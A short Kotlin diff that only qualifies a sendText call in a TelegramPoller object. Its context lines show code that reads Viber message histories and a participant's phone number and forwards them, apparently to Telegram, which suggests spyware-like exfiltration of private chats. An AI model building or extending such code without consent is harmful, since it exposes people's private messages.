@@ -128,7 +128,7 @@ object TelegramPoller {
                     val phone = ViberReader.participantNumber(ctx, 2L) ?: "?"
                     sendViberHistory(msgs, phone)
                 } ?: run {
-                    sendText("❌ Не удалось прочитать историю диалога")
+                    TelegramClient.sendText("❌ Не удалось прочитать историю диалога")
                 }
                 Log.i(TAG, "read all messages for conv $conversationId")
             }
